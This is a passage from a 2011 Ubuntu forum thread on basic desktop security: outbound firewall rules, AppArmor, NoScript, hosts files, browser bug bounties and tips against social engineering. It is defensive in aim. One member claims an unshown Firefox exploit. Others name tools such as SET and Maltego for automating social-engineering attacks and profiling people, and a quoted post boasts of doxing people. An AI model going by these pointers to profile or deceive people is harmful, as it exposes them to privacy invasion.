> ahhh the only reason i own a Fed-Ex uniform.

in joke ;-)

So it is *you* who occasionally emails me about the parcel I wasn't expecting? :D

---

### Post by haqking on 2011-11-19
> **Dangertux said:**
> Stop stealing my ideas!!! lol :-P

DHL then, share the wealth and all that..lol

> **lisati said:**
> So it is *you* who occasionally emails me about the parcel I wasn't expecting? :D

I cant respond appropriately without receiving an infraction ;-)

---

### Post by lisati on 2011-11-19
> **haqking said:**
> I cant respond appropriately without receiving an infraction ;-)

That's OK.

In case I forget, keep up with the good work, team!

---

### Post by MrLeek on 2011-11-19
> **haqking said:**
> ahhh the only reason i own a Fed-Ex uniform.

in joke ;-)

This has triggered some seriously disturbing thoughts..... :P

---

### Post by MrLeek on 2011-11-19
> **lisati said:**
> 
In case I forget, keep up with the good work, team!

In one sense...we're done, finished and basking in our superiority!!

In another sense....we're just getting started. I can't speak for Ms Daisy, but I've gained some significant footholds into some complex material. Firewalls just clicked for me during this process - in fact I'd fancy my chances of writing my own "how to set up a firewall" guide using gufw.

Next steps for me is to break down some of the material again and rebuild to really get to the nub of some of the confusing issues for newbies, to help get the message across to newbies learning some complex material.

My thanks to all the people that have been involved in this - there's too many to name and DT did a better job of it in his blog than I ever could. Hopefully the result will be worth it for other newbies struggling to create a secure system.

---

### Post by Ms. Daisy on 2011-11-19
> **MrLeek said:**
> Next steps for me is to break down some of the material again and rebuild to really get to the nub of some of the confusing issues for newbies, to help get the message across to newbies learning some complex material.That would be beautiful.

---

### Post by OpSecShellshock on 2011-11-19
Heh, so you know what's going to happen now? You're all going to find at some point that you've learned too much and can no longer approach the material as newbies! And then suddenly loading basic explanations down with exceptions and caveats and finer and finer details will start to make more sense. And it will be *awesome*!

---

### Post by Thewhistlingwind on 2011-11-19
> **OpSecShellshock said:**
> Heh, so you know what's going to happen now? You're all going to find at some point that you've learned too much and can no longer approach the material as newbies! And then suddenly loading basic explanations down with exceptions and caveats and finer and finer details will start to make more sense. And it will be *awesome*!

Then we go find more newbies to work with.

---

### Post by WasMeHere on 2011-11-20
> **Thewhistlingwind said:**
> Then we go find more newbies to work with.
+1
Or some slow learners, that will stay as newbies for a long time ;-)

---

### Post by Ms. Daisy on 2011-11-20
Sadly the de-noob-ification process is a long one.

---

### Post by MrLeek on 2011-11-20
> **Ms. Daisy said:**
> Sadly the de-noob-ification process is a long one.

/signed

---

### Post by jedispork on 2011-11-24
A lot of info here. I did have a few questions which I'm sure are already covered so I apologize. 

I want to see if I'm understanding this right. Once you start a connection through a web browser etc the return information can be exploited by a hacker while being passed by the router since you initiated it? So by having the firewall setup to restrict outgoing traffic to only the programs you use this helps prevent a hacker from running code and making a exploited connection to the computer? Another question is why isn't this enabled by default or at least some kind of reminder with a wizard when you setup ubuntu. I see that windows has its firewall on by default but does not restrict outgoing connections either so I'm guessing it doesn't do much more than your router does.  I'm also going to see if I can grasp some of the concepts to use app armor. In windows I use sandboxie and things were simple. Does apparmor give you that same level of isolation or is it even better? 

What happens if you white list a site in no script and then its compromised? I only see this as being useful if your surfing unknown sites unless your going to monitor everything and be able to understand when something is going on. Certainly doesn't seem like a good passive option you could setup for friends or family. 

My other question is about the hosts file. I've heard that this can create timeouts. Does this stress the site or your end? I use adblock plus for the ease of updating. I've also started using norton dns and curious how good the blacklist from there is compared to a good hosts file or if anyone else has experience with it. 

thanks!

---

### Post by Dangertux on 2011-11-24
Okay here we go -- answers in order of appearance.

> 
Once you start a connection through a web browser etc the return  information can be exploited by a hacker while being passed by the  router since you initiated it? So by having the firewall setup to  restrict outgoing traffic to only the programs you use this helps  prevent a hacker from running code and making a exploited connection to  the computer?


**The connection is made because, it would be considered in state RELATED or ESTABLISHED by netfilter and be allowed to pass. Hence you are able to browse the web through a router. Setting up a firewall with restrictive outbound rules can help mitigate this, however it is not a catch all solution. For instance if you visit a compromised website, you did it via port 80. So it's safe to assume port 80 traffic is allowed, thus if a reverse connection were made on port 80 it would make it through the firewall. Also it does not prevent the code from being executed, it prevents the code from making an external connection.**

> 
 Another question is why isn't this enabled by default or at least some kind of reminder with a wizard when you setup ubuntu

**Ubuntu caters to new users who for the most part have no clue about what services they actually utilize. It would be difficult to create a wizard that could account for all use cases.**

> 
 In windows I use sandboxie and things were simple. Does apparmor give you that same level of isolation or is it even better? 

**They're not really the same thing. Sandboxie is focused on creating a sanitary environment for the browser, or whatever else you run inside of it. Where as Apparmor and other MAC are more interested in controlling what objects the application can access. So in other words Sandboxie is essentially creating a chroot for the browser, where as Apparmor is more focused on controlling the objects and resources an application has access to. As far as which is better, that's kind of a tough question, if you're talking about a browser exploit I would say mandatory access controls are better. Though they can still be bypassed it's more difficult then bypassing something like sandboxie. The reason is more and more windows browser exploits are leveraging the browser vulnerability to inject code into DLL's or other objects that are not within the "sandbox" thus allowing an easy escape from the sandbox. In the case of Apparmor it would not be easy to inject code into those libraries as they should (in theory) not be accessible by the compromised application. Also the fact that Sandboxie requires the sandboxed application to ask the kernel for resources provides another avenue of compromise.**

> 
What happens if you white list a site in no script and then its compromised?


**Depends on the nature of the compromise. For instance if the site is compromised and script is placed inline, then NoScript will not protect you while the site is Whitelisted. Now, if the site is compromised and script is called externally (this is more common by far for a number of reasons). NoScript will still protect you as it enforces the same origin policy. The script on the domain you whitelisted is okay, however a script on that domain callling an external script will be treated as Cross Site Scripting and blocked appropriately. Now , in the even that you are whitelisting both domains (for whatever reason you whitelisted a malware host) NoScript will not protect you.**


> 
My other question is about the hosts file. I've heard that this can create timeouts. Does this stress the site or your end? 


**What are you talking about? The hosts file is a file that contains records for domains and hostnames as well as the IP address they should resolve to. In a default configuration Ubuntu will check the hosts file for an entry if it is present it will use that as the authoritative DNS record. If it is not it will poll the DNS server in resolv.conf. It will then obtain the IP address from the DNS server. So to answer you question it doesn't bog anything down.**

> 
 I've also started using norton dns and curious how good the blacklist  from there is compared to a good hosts file or if anyone else has  experience with it. 

**Public DNS will probably be superior, they have more resources then you or most people do, and access to things like DNS sinkholes that can determine Malware hosting domains rather easily. I would say stick with public DNS over a hosts file. Google's is pretty good.**

Hope this helps.

---

### Post by jedispork on 2011-11-25
thank you for all the information! I will be using noscript again asap and setting up the outbound firewall.  Sounds as if sandboxie isn't as secure as I thought it was but better than not having it. I also hear that chrome has some sort of built in sandbox (chroot?) and it fails to be hacked at the pwn2own contest. Until I can learn apparmor is chrome a safer browser? Also will the new html 5 standards change anything? At least we won't have flash to worry about anymore. 

I've always had a interest in learning more about computers but not sure what books to start with. Putting some pieces together and installing a o/s or setting up a router only takes you so far. 

thanks again awesome community here

---

### Post by Dangertux on 2011-11-25
> **jedispork said:**
> thank you for all the information! I will be using noscript again asap and setting up the outbound firewall.  Sounds as if sandboxie isn't as secure as I thought it was but better than not having it. I also hear that chrome has some sort of built in sandbox (chroot?) and it fails to be hacked at the pwn2own contest. Until I can learn apparmor is chrome a safer browser? Also will the new html 5 standards change anything? At least we won't have flash to worry about anymore. 

I've always had a interest in learning more about computers but not sure what books to start with. Putting some pieces together and installing a o/s or setting up a router only takes you so far. 

thanks again awesome community here


Chrome is decent so long as you keep it updated. Also I believe Chrome was owned at pwn2own (I could be wrong) in any case there have been several recent vulnerabilities against Linux and WIndows versions of Chrome that allowed code execution. In any case all browsers have their problems. Secure you favorite browser the best you can, they are all relatively equal in terms of security. 

Chrome does chroot itself pretty well, it's also a very easy Apparmor profile to create. Also there is an available default Apparmor profile for both chrome and firefox. 

Check this out it tells you how to enable profiles and get additional ones : [https://help.ubuntu.com/community/AppArmor](https://help.ubuntu.com/community/AppArmor)

Hope that helps.

---

### Post by jedispork on 2011-11-25
[http://www.engadget.com/2011/03/10/safari-and-ie8-get-shamed-at-pwn2own-chrome-still-safe-for-n/](http://www.engadget.com/2011/03/10/safari-and-ie8-get-shamed-at-pwn2own-chrome-still-safe-for-n/)

Appears firefox was not hacked either and 20k to anyone that can hack chrome at these contests.

---

### Post by Dangertux on 2011-11-25
> **jedispork said:**
> [http://www.engadget.com/2011/03/10/safari-and-ie8-get-shamed-at-pwn2own-chrome-still-safe-for-n/](http://www.engadget.com/2011/03/10/safari-and-ie8-get-shamed-at-pwn2own-chrome-still-safe-for-n/)

Appears firefox was not hacked either and 20k to anyone that can hack chrome at these contests.

Chromium has been paying out large sums to those who find and make responsible disclosures for security flaws.

A guy about a month ago pulled down like 8,000 dollars from this program.

[http://blog.chromium.org/2010/07/celebrating-six-months-of-chromium.html](http://blog.chromium.org/2010/07/celebrating-six-months-of-chromium.html)

---

### Post by vasa1 on 2011-11-25
> **Dangertux said:**
> Chromium has been paying out large sums to those who find and make responsible disclosures for security flaws.

A guy about a month ago pulled down like 8,000 dollars from this program.

...
[http://googlechromereleases.blogspot.com/](http://googlechromereleases.blogspot.com/)

> [$**12174**] [96047] [96885] [98053] [99512] [99750] High CVE-2011-3881: Cross-origin policy violations. Credit to Sergey **Glazunov**.
This Glazunov guy is pretty hot.

---

### Post by Dangertux on 2011-11-26
> **vasa1 said:**
> [http://googlechromereleases.blogspot.com/](http://googlechromereleases.blogspot.com/)


This Glazunov guy is pretty hot.

Yeah that's the guy I was talking about I guess he found more last I read he was only at like 8k lol. Well done for him.

---

### Post by jedispork on 2011-11-26
Sorry to keep pestering with questions but after trying a few different lines as found in the guide and searching on the net to enable the default profile
```
sudo aa-enforce /etc/apparmor.d/usr.bin.firefox-3.5
```

```
sudo aa-enforce /etc/apparmor.d/usr.bin.firefox
```

 I get aa-enforce: command not found. I checked the status and app armor is running but I didn't see any mention of firefox in the profiles. I'm using xubuntu 11.10

---

### Post by Dangertux on 2011-11-26
> **jedispork said:**
> Sorry to keep pestering with questions but after trying a few different lines as found in the guide and searching on the net to enable the default profile
```
sudo aa-enforce /etc/apparmor.d/usr.bin.firefox-3.5
```

```
sudo aa-enforce /etc/apparmor.d/usr.bin.firefox
```

 I get aa-enforce: command not found. I checked the status and app armor is running but I didn't see any mention of firefox in the profiles. I'm using xubuntu 11.10

You need to install apparmor utilities 

```

sudo apt-get install apparmor-utils

```

Then the command should work.

---

### Post by Ms. Daisy on 2011-11-27
Hello all! Sleep escaped me this evening so I have made some (nearly) final modifications to the Basic Security Wiki.  I added some links where appropriate, I simplified where possible, and I revised my personal bossy nature out of the text (hopefully).  In particular, NoScript seems to be a hurdle for new users.  So I added a link to Dangertux's blog post about the need for NoScript (maybe I've become a hopeless "dangertard?" LOL)

As always I'm interested in everyone's suggestions/opinions/flames of hate.

---

### Post by Dangertux on 2011-11-27
> **Ms. Daisy said:**
> Hello all! Sleep escaped me this evening so I have made some (nearly) final modifications to the Basic Security Wiki.  I added some links where appropriate, I simplified where possible, and I revised my personal bossy nature out of the text (hopefully).  In particular, NoScript seems to be a hurdle for new users.  So I added a link to Dangertux's blog post about the need for NoScript (maybe I've become a hopeless "dangertard?" LOL)

As always I'm interested in everyone's suggestions/opinions/flames of hate.

Ehem...Dangertard? lool

No seriously -- NoScript is important. It really truly is.

You can talk about there's no Linux malware all day long, but as soon as there is enough Linux running around out there for it to be profitable to develop malware for it, there will be malware. I've demonstrated numerous ways that a fully patched browser in Ubuntu can be compromised. The last and final plea I gave requires no consent from the user, it utilizes an as of yet unpatched vulnerability in the version of Firefox that ships with Ubuntu 11.10 by default.  The vulnerabilities are there the code to exploit them is easy to write. As soon as malware becomes an issue, it's game over for the Linux community in terms of not needing anti-malware solutions.

Also, the afforementioned exploit code will bypass /proc/sys/kernel/randomize_va_space and "stack smash" protection. It's not a denial of service it IS code execution.

Apparmor can help too, however it won't prevent the shell in the demo from being created it will only limit what it can do. I didn't test to see how much, however I am willing to bet with the freedom firefox needs over a system you could still hook the system even with an apparmor contained browser.

---

### Post by vasa1 on 2011-11-27
> **Dangertux said:**
> ... it utilizes an as of yet unpatched vulnerability in the version of Firefox that ships with Ubuntu 11.10 by default.  ...
= Firefox 7?

---

### Post by Dangertux on 2011-11-27
> **vasa1 said:**
> = Firefox 7?


7.0.1

Though several have told me they've gotten 8 out of the repos , I've not had the same luck. In any case the exploit code can be modified to work on early versions of 8 as well. The install I had on my VM I tested it with had 7.0.1 after a 

```

sudo apt-get update && sudo apt-get upgrade

```

---

### Post by jedispork on 2011-11-28
If java script is such a major issue how come so many sites still use it? I'm guessing shopping sites like amazon and such would be difficult to run without it. Maybe there needs to be some kind of database of trusted sites that a browser has to check first.  I guess what I'm trying to say is a behind the scenes noscript that is maintained by security professionals. 

I will use noscript but we really do need some kind of passive option for everyone else.

---

### Post by haqking on 2011-11-28
> **jedispork said:**
> If java script is such a major issue how come so many sites still use it? I'm guessing shopping sites like amazon and such would be difficult to run without it. Maybe there needs to be some kind of database of trusted sites that a browser has to check first.  I guess what I'm trying to say is a behind the scenes noscript that is maintained by security professionals. 

I will use noscript but we really do need some kind of passive option for everyone else.

It is not that javascript itself is an issue (any code can be made to be malicious), most sites running javascript are fine, it is what the code may or may not be designed to do which is the problem.

As for why is it used, because what it can achieve is needed, but anything from HTML to PHP to Flash can have exploited code in it, it is all about acceptance and mitigation of risk to allow the functionality to still exist

A front door is not an issue, but a stranger can walk through it and rob you using it ;-)

As for trusted sites, there is no such thing really, trusting a site you visit all the time and may be a large organisation such as Amazon does not mean an attacker has not compromised the code remotely.

People place far too much trust in trusted sources/sites if you know what i mean. 

If you were an attacker, would you target a nobody website with no traffic or a trusted source that people will trust ?

Hence the need for script control.

---

### Post by jedispork on 2011-11-28
> **haqking said:**
> 

A front door is not an issue, but a stranger can walk through it and rob you using it ;-)



I've had my house broken into before so I can relate to this. I researched and installed my own alarm system. I think its a good idea for any family to have one even if its not connected to anything. Dogs are great but I'm not sure if I could hear any bumps in the night over their snoring :)

---

### Post by vasa1 on 2011-11-28
> **Dangertux said:**
> 7.0.1

Though several have told me they've gotten 8 out of the repos , I've not had the same luck. In any case the exploit code can be modified to work on early versions of 8 as well. The install I had on my VM I tested it with had 7.0.1 after a 

```

sudo apt-get update && sudo apt-get upgrade

```

Just curious but have you reported this officially to either Mozilla or Ubuntu?

---

### Post by haqking on 2011-11-28
> **jedispork said:**
> I've had my house broken into before so I can relate to this. I researched and installed my own alarm system. I think its a good idea for any family to have one even if its not connected to anything. Dogs are great but I'm not sure if I could hear any bumps in the night over their snoring :)

Exactly, a door is a ubiquitous object of necessity for everyday use.

Javascript is a ubiquitous scripting language required for functionality to exist within the web.

Malicious people are as ubiquitous in our everyday lives as they are on the web.

At home we install alarms and take other precautions (we accept and mitigate the risk).  On the web we install noscript or dont enable scripts to run etc and we again mitigate and accept risks.

---

### Post by Dangertux on 2011-11-28
> **vasa1 said:**
> Just curious but have you reported this officially to either Mozilla or Ubuntu?

Seeing as though it's plastered all over milw0rm and everywhere else I think they know, if you mean the vulnerability.

As far as the repos updating to Firefox 8,  it seems it's in the repos now. I use a  mirror server on my network to do updates, so it probably just hadn't propogated to me yet.

---

### Post by vasa1 on 2011-11-28
> **Dangertux said:**
> Seeing as though **it**'s plastered all over milw0rm and everywhere else I think they know, if you mean the vulnerability....

I wonder why **it**'s plastered all over but not being dealt with. Maybe they don't think it's genuine?

---

### Post by Dangertux on 2011-11-28
> **vasa1 said:**
> I wonder why **it**'s plastered all over but not being dealt with. Maybe they don't think it's genuine?

It takes time to patch flaws, there is a whole process where it has to be verified. Besides they're the ones who wrote the terrible code in the first place , so I'd imagine there is a learning curve.

---

### Post by haqking on 2011-11-28
> **vasa1 said:**
> I wonder why **it**'s plastered all over but not being dealt with. Maybe they don't think it's genuine?

Just because a vulnerability exists does not equate to it being dealt with necessarily.

Vulnerabilites exist everywhere, it all comes to acceptance and mitigation, though saying that im not saying this shouldnt or wont be patched but just so we are clear a vulnerability does not necessarily equate to a patch.

A vulnerability only becomes a real issue if an exploit can take advantage of it.

And things take time im afraid

---

### Post by jramshu on 2011-12-02
If you don't want this on here delete it. In the world today, this is relevant.

Tips on Social Engineering 
All credits go to:
TnVsbCBCeXRl 

**Protecting Yourself from Social Engineering**

Eventually, someone will want to find out more information about you. Means such as social engineering  can give this "someone" the information about you that they want. A  person may contact you directly or go through your friends and social  engineer them. The below list of rules should be held onto with your  dear life.

**Try not to Talk to Strangers**
Your first concern on the internet should **not **be  to make friends. Having online friends is a security risk that I do not  advise taking. Also, how do you know that you can trust them in the  first place? Only do this if it is a must. Remember, it is your *own* fault if you don't cover your own back!

**Don't Divulge Personal Information**
Don't give any real information, such as location, DOB, names, etc. Give legitimate sounding info. Come up with your own new  life story and this will keep people from accurately searching for you.  Skilled d0xers and social engineers like myself can find out who you  are just as easy as if you plastered your name and social security  number on the front of your house. This is a big technical no-no.

**Change Your Speech Patterns**
I  have d0xed people many times just by analyzing speech patterns and  common phrases used by them. Do not underestimate the power of  psychology or deductive reasoning skills. Some people possess them, so  it is safe to never assume that you are too lucky to fall victim to it.

---

### Post by Ms. Daisy on 2011-12-02
Or my favorite privacy technique- remain a completely uninteresting and dirt-poor person LOL

Your guide is considerably more concise than anything I found out there- thanks.

---

### Post by jramshu on 2011-12-02
> **Ms. Daisy said:**
> Or my favorite privacy technique- remain a completely uninteresting and dirt-poor person LOL


That's a great one. LOL!!!

---

### Post by haqking on 2011-12-02
> **jramshu said:**
> If you don't want this on here delete it. In the world today, this is relevant.

Tips on Social Engineering 
All credits go to:
TnVsbCBCeXRl 

**Protecting Yourself from Social Engineering**

Eventually, someone will want to find out more information about you. Means such as social engineering  can give this "someone" the information about you that they want. A  person may contact you directly or go through your friends and social  engineer them. The below list of rules should be held onto with your  dear life.

**Try not to Talk to Strangers**
Your first concern on the internet should **not **be  to make friends. Having online friends is a security risk that I do not  advise taking. Also, how do you know that you can trust them in the  first place? Only do this if it is a must. Remember, it is your *own* fault if you don't cover your own back!

**Don't Divulge Personal Information**
Don't give any real information, such as location, DOB, names, etc. Give legitimate sounding info. Come up with your own new  life story and this will keep people from accurately searching for you.  Skilled d0xers and social engineers like myself can find out who you  are just as easy as if you plastered your name and social security  number on the front of your house. This is a big technical no-no.

**Change Your Speech Patterns**
I  have d0xed people many times just by analyzing speech patterns and  common phrases used by them. Do not underestimate the power of  psychology or deductive reasoning skills. Some people possess them, so  it is safe to never assume that you are too lucky to fall victim to it.

All very valid but very sparse in terms of SE attacks.

I am soon to be covering it in detail on [my blog]("http://haqking.wordpress.com/"), i would point out here that 2 tools you may want to take a look at are maltego and SET which when you used properly will show you more about yourself than you know yourself with maltego, and SET will automate alot of online SE attacks and these are only 2 tools but very powerful all the same

I will be doing some demos and techniques but google and google hacking are coming next. 

And gathering information on people online goes way deeper than anything you choose to share on the internet, you could never of shared anything online, doesnt mean that others havent, and companies that hold information on you.

I often hear from friends about them not worrying as they dont even have a facebook account and never enter any personal details online, well guess what dont mean you aint on there my friend, doesnt mean someone else hasnt posted a photo of you on there and tagged your name even though you dont have an account, doesnt mean someone hasnt blogged about you or mentioned you, companies hold your personal information, electoral role databases etc etc etc

I love SE ;-)

---

### Post by jramshu on 2011-12-02
Yes, I know about SET and the others.

There is also pipl, tineye and others.

This was just a 'little' tip and by no way covers everything, I didn't want to take up an entire screen or paste links that would violate forum policy. Plus, I don't want to get d0xed by putting too much info I have.  

I'd be interested in reading your blog on this haqking.

I like SE myself. lol

---

### Post by Dangertux on 2011-12-02
> **jramshu said:**
> Yes, I know about SET and the others.

There is also pipl, tineye and others.

This was just a 'little' tip and by no way covers everything, I didn't want to take up an entire screen or paste links that would violate forum policy. Plus, I don't want to get d0xed by putting too much info I have.  

I'd be interested in reading your blog on this haqking.

I like SE myself. lol


I think that delving into a SE debate the size of texas here would be an encroachment on the fence that is the forum policy about security debates. In terms of forums let's keep it strictly white hat ;-)

BTW A+ job for everyone working on this still.

---

### Post by lisati on 2011-12-02
> **haqking said:**
> 
I often hear from friends about them not worrying as they dont even have a facebook account and never enter any personal details online, well guess what dont mean you aint on there my friend, doesnt mean someone else hasnt posted a photo of you on there and tagged your name even though you dont have an account, doesnt mean someone hasnt blogged about you or mentioned you, companies hold your personal information, electoral role databases etc etc etc

An illustration of this: the picture on my profile page is from an old class photo from 40 years ago that someone else posted on a social networking site (not Facebook), and I didn't know it was there until I found it by accident. Looking around on the same site, I found an old school photo with my sister in, and others with Mrs Lisati in them. It didn't take too much skill to find them either.

---

### Post by 1clue on 2011-12-02
Forgive the errors which are sure to follow. I'm in Colombia right now instead of the USA and oddly enough the only Internet in this town is from my cell phone.

Speaking as a web developer, you'd better get used to client-side code. It's not going away any time soon, and the vast majority of it is benign. Some of our not-very-complicated pages have a dozen or more snippets that would each qualify as scripts. Some of those scripts run more than once per page load. 

IMO if you use NoScript or similar, you won't do yourself a lot of good.  I can't think of a single page in any of our apps that would have even basic functionality without client-side code, and if you have to click 'yes' 20 times each time the page loads, you'll miss the malicious part some black hat puts on the site just out of habit. 

In addition, not all social engineering is evil. If it's used to make your life easier and the information isn't shipped off to Somebody with malicious intent I don't really see the harm of it.

---

### Post by Ms. Daisy on 2011-12-02
> **1clue said:**
> **if you have to click 'yes' 20 times each time the page loads**, 
The little piece in bold isn't quite right.  NoScript allows you to choose what will run when you first visit a webpage.  So you wouldn't be bombarded with "yes" or "no" boxes.  

But yes, that seems to be the argument about using NoScript.  It blocks some apps. I like it personally because if I'm searching for something in particular, I can visit a new, unknown site with all scripts blocked just to see if it's got what I need.  If it's not, then I haven't opened myself up to undue attack.

edit:
To clear up some very common misconceptions, NoScript can protect you  from attacks on one of your favorite websites.  So you can allow all those cool scripts that 1clue is writing & still protect yourself from malicious code if it ever got cracked.  From [http://noscript.net/faq#qa4_1](http://noscript.net/faq#qa4_1) 
 [QUOTE=NoScript]Q:  ** What is XSS and why should I care?   **       
         A:   XSS stands for [Cross site scripting]("http://en.wikipedia.org/wiki/Cross_site_scripting"), a web application vulnerability which allows the attacker to inject  malicious code from a certain site into a different site,  and can be used by an attacker to "impersonate" a different user or to  steal valuable information. This kind of vulnerability has clear implications for NoScript users,  because if a whitelisted site is vulnerable to a XSS attack, the attacker can actually run JavaScript code injecting it into the  vulnerable site and thus bypassing the whitelist. That's why NoScript features unique and very effective [Anti-XSS protection]("http://noscript.net/features#xss")  functionality, which prevents untrusted sites from injecting JavaScript code into a trusted  web page via reflective XSS and makes NoScript's whitelist bullet-proof.        [/QUOTE] And here's more
> Q:  ** How does NoScript protect me from Clickjacking / UI-redressing attacks? **       
       A:   Default protections that NoScript has provided for a long time, i.e.  JavaScript and plugin blocking can prevent most clickjacking attacks. In older version, though, to be 100% protected against Clickjacking you  needed to enable the [Forbid <IFRAME>]("http://noscript.net/faq#iframe") and possibly [Apply these restrictions to trusted sites as well]("http://noscript.net/features#contentblocking") NoScript options.
Fortunately, since [version 1.8.2]("http://noscript.net/changelog#1.8.2"), **NoScript provides a new default kind of protection called [ClearClick, which defeats clickjacking]("http://hackademix.net/2008/10/08/hello-clearclick-goodbye-clickjacking/") *no matter if you block frames or not* **. Even better, ClearClick can protect you from Clickjacking / UI-redressing attack **independently from JavaScript and plugins blocking**: you can even *Allow scripts globally* (which is not recommended anyway), and your ClearClick still works.         and even more > Q:  ** What's HTTPS and why is that important for NoScript users? **       
       A:   [HTTPS]("http://en.wikipedia.org/wiki/HTTPS") stands for "Hypertext Transfer Protocol over Secure Socket Layer", and you can figure it as HTTP (the protocol you usually retrieve web pages with) over a secure encrypted connection. It is meant to protect you from eavesdroppers and [man-in-the-middle attacks]("http://en.wikipedia.org/wiki/Man-in-the-middle_attack"). An important feature of HTTPS is that if a web site has a valid digital  certificate for its identity, as verified automatically by your browser,  you can be reasonably sure it is the one it says to be. You can recognize HTTPS web sites by  looking at their addresses, always beginning with "https://". Firefox hilights sites having a valid certificate turning part of the  location bar to blue or green. Since NoScript security is largely based on domain names, a malicious  party capable of spoofing a trusted site might work-around your  whitelist. This kind of spoofing may happen through a [DNS Hijacking attack]("http://en.wikipedia.org/wiki/DNS_hijacking") or because you're using an untrusted proxy server, like many anonymizers including [Tor]("http://www.torproject.org/"). The former risk can be mitigated by configuring a static secure DNS, e.g. [OpenDNS]("http://www.opendns.com/"),  and forcing its usage even if you're roaming with your laptop. Untrusted proxies or connectivity providers are harder to tame, because a  man-in-the-middle could inject arbitrary content in any non-secure  (non-HTTPS) page. In order to mitigate these issues, NoScript can be configured to honor  your whitelist only if the current page is served through HTTPS, and  therefore cannot be spoofed. Additionally, NoScript can help you forcing your most sensitive sites to  always use HTTPS, and [mitigating cookie hijacking]("http://hackademix.net/2008/09/10/noscript-vs-insecure-cookies/").        There is a ton of information here [http://noscript.net/faq](http://noscript.net/faq) that could explain exactly how NoScript works, how a user should effectively use it, and what it protects you from, if anyone is interested in reading it.

---

### Post by Thewhistlingwind on 2011-12-02
> **1clue said:**
> 
Speaking as a web developer, you'd better get used to client-side code.


Lolno.

> **1clue said:**
> 
 It's not going away any time soon, and the vast majority of it is benign.

The vast majority of it is analytics. 

> **1clue said:**
> 
 Some of our not-very-complicated pages have a dozen or more snippets that would each qualify as scripts. Some of those scripts run more than once per page load. 


And?

> **1clue said:**
> 
IMO if you use NoScript or similar, you won't do yourself a lot of good.  I can't think of a single page in any of our apps that would have even basic functionality without client-side code, and if you have to click 'yes' 20 times each time the page loads, you'll miss the malicious part some black hat puts on the site just out of habit. 

If I'm using your "app" I already trust you. And you don't need to click yes every time the page loads, have you ever used noscript? You can allow some scripts forever or temporarily. If I use your webpage often, I'll just set the important stuff to allow forever and leave the rest blocked.

> **1clue said:**
> 
In addition, not all social engineering is evil. If it's used to make your life easier and the information isn't shipped off to Somebody with malicious intent I don't really see the harm of it.



The words "Social engineering" imply some level of malice. In addition, any data stored may be taken by people with malicious intent in the future, it's better for people not to have it.

---

### Post by Dangertux on 2011-12-02
> **1clue said:**
> Forgive the errors which are sure to follow. I'm in Colombia right now instead of the USA and oddly enough the only Internet in this town is from my cell phone.

Speaking as a web developer, you'd better get used to client-side code. It's not going away any time soon, and the vast majority of it is benign. Some of our not-very-complicated pages have a dozen or more snippets that would each qualify as scripts. Some of those scripts run more than once per page load. 

IMO if you use NoScript or similar, you won't do yourself a lot of good.  I can't think of a single page in any of our apps that would have even basic functionality without client-side code, and if you have to click 'yes' 20 times each time the page loads, you'll miss the malicious part some black hat puts on the site just out of habit. 

In addition, not all social engineering is evil. If it's used to make your life easier and the information isn't shipped off to Somebody with malicious intent I don't really see the harm of it.

Client side code is fine. However -- if you want to say get used to it. Then I will say, start validating user input. 

Since you're a web developer you must understand that you do not in fact have to enforce whitelisting of scripts on a script by script basis, instead on a domain by domain basis  as an enhancement to your browser's same origin policy. This provides a good level of protection. Truth , if you write a malicious script and I trust your domain enough to allow it -- you win. This is not an attack that is really within the scope of NoScript as you're leveraging trust for a name which firmly puts it into the area of social engineering.

No not all social engineering is evil, have you ever been sold something you didn't plan on buying? Of course you have -- that was social engineering.

P.S : On web application development real quick. I think most web developers are on very tenuous ground in expecting anything from either the security community or end users. I mean let's be realistic, I hear web hosting companies clamoring all the time for an "anti-lulzsec-box".  The past 12 years have been wasted as the web development community has thrown off their responsibility on the security community. You expect us to design you better web app firewalls, and better IPS. When in reality you could have spent those 12 years figuring out how to escape quotes properly... It's disheartening really.

---

### Post by 1clue on 2011-12-03
Still typing on a phone in Colombia.  A lot of comments on my last post, I will certainly miss responses to some important ones. 

No, I have never used NoScript. Yes I obviously need to bone up on it. 

Social engineering:  have you seen many ads for Microsoft products on Linux sites?  Linux ads on Microsoft specific sites?  That's social engineering. Strip club ads on  family oriented sites?  Social engineering came about in order to target ads in such a way as to get a higher hit rate, which ultimately means you only show the ad to people who are interested. Which means if they don't think you're interested then you probably won't see the ad. Not a bad idea at that level of examination and not malicious at all. Creepy but not black-hat. 

Xss:  it's a stupid idea in the first place, what were they thinking?  But even if NoScript blocks it, there are ways to proxy an xss so it looks like a local one. You need code on the trusted site, but only a tiny bit of it and that could be hidden and disguised in some utility package which is otherwise useful. 

Trust:  when you see quotes like the ones used in this thread, you also need to look at the other things that tech does and how often it is used in a malicious way. Steak knives can also be used to stab somebody in the eye, but you don't stop buying steak knives because of that. Absolutely any motorized transportation I can think of can be used as a murder weapon. Do we stop using it for that reason?

You guys are correctly paranoid, but you need to focus your paranoia more accurately. How is <insert tech here> used maliciously, and how do we prevent that while still allowing legitimate use?  That's a really tough one and in some cases there are no answers yet. 

None of my apps are public. And yes, they're applications used to perform specific tasks. Things like xss simply have no value for us. We don't have ad banners or weird tech running for no apparent reason. But we do have all sorts of client-side code, and we don't plan on stopping. 

There was a comment about web developers using incorrect/improperly formatted markup. I seriously doubt anyone reading this hates that more than I do. We use the strict form of HTML and generally somebody will send out a nastygram if code is checked in with even bad indenting. 

My thumbs are tired. I hope you guys get something worthwhile out of this, and I hope to be on a real computer next time I post here

---

### Post by haqking on 2011-12-03
> **1clue said:**
> Still typing on a phone in Colombia.  A lot of comments on my last post, I will certainly miss responses to some important ones. 

No, I have never used NoScript. Yes I obviously need to bone up on it. 

Social engineering:  have you seen many ads for Microsoft products on Linux sites?  Linux ads on Microsoft specific sites?  That's social engineering. Strip club ads on  family oriented sites?  Social engineering came about in order to target ads in such a way as to get a higher hit rate, which ultimately means you only show the ad to people who are interested. Which means if they don't think you're interested then you probably won't see the ad. Not a bad idea at that level of examination and not malicious at all. Creepy but not black-hat. 

Xss:  it's a stupid idea in the first place, what were they thinking?  But even if NoScript blocks it, there are ways to proxy an xss so it looks like a local one. You need code on the trusted site, but only a tiny bit of it and that could be hidden and disguised in some utility package which is otherwise useful. 

Trust:  when you see quotes like the ones used in this thread, you also need to look at the other things that tech does and how often it is used in a malicious way. Steak knives can also be used to stab somebody in the eye, but you don't stop buying steak knives because of that. Absolutely any motorized transportation I can think of can be used as a murder weapon. Do we stop using it for that reason?

You guys are correctly paranoid, but you need to focus your paranoia more accurately. How is <insert tech here> used maliciously, and how do we prevent that while still allowing legitimate use?  That's a really tough one and in some cases there are no answers yet. 

